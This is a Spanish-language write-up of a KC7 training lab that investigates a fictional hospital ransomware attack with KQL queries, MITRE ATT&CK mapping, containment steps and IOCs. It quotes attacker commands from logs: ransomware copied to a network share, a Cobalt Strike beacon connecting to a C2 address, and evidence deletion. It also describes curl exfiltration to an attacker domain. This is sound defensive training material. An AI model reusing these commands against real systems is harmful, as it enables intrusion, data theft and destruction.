# CASO 03 — Ransomware en Jojo's Hospital: doble extorsión con acceso inicial comprado

| | |
|---|---|
| **ID** | CASE-KC7-JH-003 |
| **Severidad** | Crítica (P1) |
| **Estado** | Cerrado — Verdadero Positivo |
| **Plataforma** | Azure Data Explorer (KQL) |
| **Dataset** | KC7 — *Jojo's Hospital: A Ransomware Investigation* (61 challenges) |
| **Frameworks** | MITRE ATT&CK v15 · NIST SP 800-61 Rev. 2 · Cyber Kill Chain |

Dos actores, un ataque. **SharkFin7** (Initial Access Broker) compromete credenciales con
una campaña de malvertising y vende el acceso a **LockByte**, que exfiltra historiales de
pacientes y cifra 6.420 archivos en 321 máquinas.

El caso más completo del casebook: 47 días desde la primera infección hasta el cifrado.

---

## 1. Alerta recibida

Jojo's Hospital, sistema sanitario en Lexington (Kentucky), sufre un ataque de ransomware.
LockByte exige **2 millones de dólares** al hospital con un plazo de 72 horas, y
**10.000 dólares a cada paciente** por separado, amenazando con filtrar historiales
médicos y números de la Seguridad Social.

Doble extorsión: no basta con restaurar la copia de seguridad, los datos ya salieron.

## 2. Triaje — dimensionar el impacto

```kusto
FileCreationEvents
| where filename endswith ".encrypted"
| count
```
**6.420 archivos cifrados.**

```kusto
FileCreationEvents
| where filename endswith ".encrypted"
| distinct hostname
```
**321 máquinas afectadas.** La propagación fue masiva, no puntual.

**Decisión:** Verdadero Positivo. P1. Ransomware activo con exfiltración confirmada.

## 3. Investigación

### 3.1 Punto de entrada: la nota de rescate

```kusto
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
```

La nota aparece en **una sola máquina**: `AMFB-MACHINE`, usuario `andavis`,
el 17/06/2024 a las 14:49:02.

Ese dato es la clave de toda la investigación. 321 máquinas cifradas, pero la nota está
en una. Esa es la máquina desde la que se operó.

- **SHA256:** `97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018`
- **Ruta:** `C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt`

```kusto
Employees
| where hostname == "AMFB-MACHINE"
```

**Anthony Davis** (`anthony_davis@jojoshospital.org`), IP interna `10.10.0.1`.
El paciente cero.

### 3.2 Timeline del día del incidente

```kusto
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) .. datetime(2024-06-18))
```

14 eventos de proceso que reconstruyen el día completo:

| Hora | Acción |
|---|---|
| 13:35 | `cmd.exe` copia el ransomware al recurso compartido |
| 13:37 | `powershell.exe` ejecuta scripts |
| 14:23–15:54 | `patient_data_exporter.exe` extrae datos en 3 ZIPs |
| 17:18–17:31 | `curl` exfiltra los ZIPs al exterior |
| 17:36 | `cmd.exe` borra la evidencia |

Exfiltración **antes** del cifrado. El orden importa: cuando el hospital se entera, los
datos llevan horas fuera.

### 3.3 Mecanismo de propagación

```
cmd.exe /c copy C:\Users\andavis\Downloads\lockbyte_ransomer.exe
                \\jojos-hospital.org\shared\spread_ransomware.exe
```

Una sola línea explica las 321 máquinas: el binario se copia a un **recurso compartido de
red** con un nombre genérico. Cualquier equipo con acceso al share lo ejecuta.

### 3.4 Exfiltración

`patient_data_exporter.exe`, descargado de `https://secure-health-access.com/tools/`
el 17/06 a las 14:22:29. Extrae de tres ubicaciones del servidor:

| Fichero | Origen |
|---|---|
| `patient_data_1.zip` | `\\jojos-hospital-server\important_data\patient_records` |
| `patient_data_2.zip` | `\\jojos-hospital-server\important_data\archive\patient-records` |
| `patient_data_3.zip` | `\\jojos-hospital-server\important_data\old-patient-data` |

Los tres salen por `curl` a `https://secure-health-access.com/upload/`. Después:

```
cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip
```

### 3.5 Pivoteo de infraestructura con PassiveDNS

```kusto
PassiveDns
| where domain == "secure-health-access.com"
```
Resuelve a `203.0.113.1` y `203.0.113.2`.

```kusto
PassiveDns
| where ip in ("203.0.113.1", "203.0.113.2")
```

Las mismas IPs alojan **`emr-help.net`** (EMR = *Electronic Medical Records*).

Infraestructura con temática sanitaria en ambos dominios: no es oportunismo, es un actor
especializado en el sector salud. Ese pivote convierte un IOC suelto en inteligencia.

### 3.6 Reconocimiento previo

```kusto
InboundNetworkEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
```

**37 peticiones** al sitio del hospital desde el **20/05/2024**, casi un mes antes del
cifrado. Entre las búsquedas: `how+to+bypass+security+JoJo's+Hospital` y
`JoJo's+Hospital+patient+records`.

Los datos de pacientes eran el objetivo desde el principio.

### 3.7 Acceso inicial

```kusto
AuthenticationEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
```

`Successful Login` en **MAIL-SERVER01** con la cuenta de `andavis` el 20/05/2024 desde
`203.0.113.1`. Sin fuerza bruta previa: las credenciales ya las tenían. Compradas.

### 3.8 El origen: campaña de malvertising

SharkFin7 obtuvo las credenciales con **typosquatting**: `raisinkanes.com`, imitando a
`raisingcanes.com`, una cadena de restaurantes. **26 peticiones de 24 empleados distintos.**

Un anuncio patrocinado en Google redirigía a `nothing-to-see-here.net` y
`totally-legit-domain.com`, que servían:

- `Raisin_Kane_Promo_Offer.docx` — documento con macro maliciosa
- `Raisin_Kane_Free_Meal_Voucher.pdf` — señuelo

**24 empleados** descargaron el documento. El primero, `evbrowne`, el 01/05/2024.

El vector no fue técnico: fue una oferta de comida rápida.

### 3.9 Cobalt Strike

Al abrir el `.docx`, WINWORD.EXE dropea `cobaltstrike.exe` en `C:\ProgramData\`
**27 segundos** después de la descarga.

```
"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"
```
```
C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050
```

En la máquina de Anthony Davis, el beacon conecta el **14/05/2024 a las 12:24:45**.

### 3.10 Reconocimiento interno

`systeminfo`, `ipconfig /all`, `netstat -an`, `net user`,
`net localgroup administrators`, `net view`. Después descargan
`advanced-ip-scanner.exe` para mapear la red, y exfiltran `network_diagram.pdf` y
`credentials.txt` a `nothing-to-see-here.net`.

## 4. Mapeo MITRE ATT&CK

| Táctica | Técnica | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Vulnerability Scanning | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) |
| Reconnaissance | Search Victim-Owned Websites | [T1594](https://attack.mitre.org/techniques/T1594/) |
| Resource Development | Acquire Infrastructure: Domains | [T1583.001](https://attack.mitre.org/techniques/T1583/001/) |
| Initial Access | Drive-by Compromise (malvertising) | [T1189](https://attack.mitre.org/techniques/T1189/) |
| Initial Access | Valid Accounts (compradas a un IAB) | [T1078](https://attack.mitre.org/techniques/T1078/) |
| Execution | User Execution: Malicious File | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) |
| Persistence | External Remote Services (Cobalt Strike) | [T1133](https://attack.mitre.org/techniques/T1133/) |
| Discovery | System Information Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) |
| Discovery | System Network Configuration Discovery | [T1016](https://attack.mitre.org/techniques/T1016/) |
| Discovery | Remote System Discovery | [T1018](https://attack.mitre.org/techniques/T1018/) |
| Discovery | Permission Groups Discovery | [T1069](https://attack.mitre.org/techniques/T1069/) |
| Lateral Movement | Lateral Tool Transfer | [T1570](https://attack.mitre.org/techniques/T1570/) |
| Collection | Data from Network Shared Drive | [T1039](https://attack.mitre.org/techniques/T1039/) |
| Exfiltration | Exfiltration Over Web Service | [T1567](https://attack.mitre.org/techniques/T1567/) |
| Impact | Data Encrypted for Impact | [T1486](https://attack.mitre.org/techniques/T1486/) |
| Defense Evasion | Indicator Removal: File Deletion | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) |

## 5. Veredicto

**Compromiso confirmado**, ejecutado por dos actores con reparto de funciones.

**Fase 1 — SharkFin7 (Initial Access Broker)**
Malvertising con typosquatting → dominios de redirección → `.docx` con macro →
Cobalt Strike → C2 en `93.238.22.122:50050` → reconocimiento interno → robo de
`credentials.txt` → **venta del acceso**.

**Fase 2 — LockByte (ransomware)**
Acceso con credenciales compradas → login en MAIL-SERVER01 → reconocimiento web →
`patient_data_exporter.exe` → exfiltración de 3 ZIPs → propagación por network share →
6.420 archivos cifrados en 321 máquinas → doble extorsión.

**Timeline:**

| Fecha | Hito |
|---|---|
| 01/05/2024 | Primera descarga del docx malicioso (`evbrowne`) |
| 14/05/2024 | Anthony Davis infectado; Cobalt Strike conecta al C2 |
| 20/05/2024 | Login en MAIL-SERVER01 con credenciales robadas; empieza el reconocimiento |
| 17/06/2024 | Exfiltración, despliegue del ransomware y nota de rescate |

**47 días** entre la primera infección y el cifrado. Hubo tiempo de sobra para detectarlo.

## 6. Contención recomendada

1. Aislar las 321 máquinas afectadas.
2. Bloquear IPs (`203.0.113.1`, `203.0.113.2`, `93.238.22.122`) y los seis dominios.
3. Revocar las credenciales de Anthony Davis y de los 24 empleados afectados.
4. Buscar y eliminar `cobaltstrike.exe` en `C:\ProgramData\` de todas las máquinas.
5. Eliminar `spread_ransomware.exe` del recurso compartido.
6. Notificar a los pacientes conforme a HIPAA.
7. Filtrado web y DNS contra typosquatting.
8. Desplegar EDR capaz de detectar beacons de Cobalt Strike.

## 7. Lecciones aprendidas

- **47 días de Cobalt Strike sin detección.** Es el dato que define el caso. No faltó
  tiempo de reacción: faltó capacidad de detección en el endpoint.
- **Sin protección contra malvertising.** El acceso inicial entró por un anuncio
  patrocinado, no por una vulnerabilidad.
- **Macros de Office sin restringir.** 27 segundos entre abrir el documento y tener C2.
- **Sin MFA.** Unas credenciales robadas un mes antes seguían siendo válidas.
- **Datos de pacientes en shares sin segmentar**, accesibles desde cualquier equipo.
- **Sin monitorización de exfiltración.** Tres ZIPs por `curl` a un dominio externo no
  generaron ni una alerta.
- **El ecosistema criminal está especializado.** Un actor compromete y otro monetiza.
  Defenderse solo del ransomware es llegar tarde: el acceso se vendió semanas antes.

## 8. IOCs

| IOC | Tipo |
|---|---|
| `203.0.113.1` | IP atacante (acceso y reconocimiento) |
| `203.0.113.2` | IP atacante (reconocimiento) |
| `93.238.22.122:50050` | C2 de Cobalt Strike |
| `secure-health-access.com` | Descarga de herramienta y exfiltración |
| `emr-help.net` | Dominio adicional (hallado por PassiveDNS) |
| `nothing-to-see-here.net` | Redirección de malvertising |
| `totally-legit-domain.com` | Redirección de malvertising |
| `raisinkanes.com` | Typosquatting |
| `freerainsingkanes.net` | Typosquatting |
| `lockbyte_ransomer.exe` | Binario del ransomware |
| `spread_ransomware.exe` | Ransomware renombrado en el share |
| `cobaltstrike.exe` | Beacon C2 |
| `patient_data_exporter.exe` | Herramienta de exfiltración |
| `Raisin_Kane_Promo_Offer.docx` | Dropper |
| `We_Have_Your_Data_Pay_Up.txt` | Nota de rescate |
| `97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018` | SHA256 de la nota |
| `bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712` | SHA256 del docx |
| `andavis` (Anthony Davis) | Cuenta comprometida (paciente cero) |

---

## Reproducir el caso

Módulo gratuito en [KC7](https://kc7cyber.com) — *Jojo's Hospital: A Ransomware
Investigation*. Solo requiere navegador y cuenta de Microsoft.
Detalles en [`../docs/lab-setup.md`](../docs/lab-setup.md).
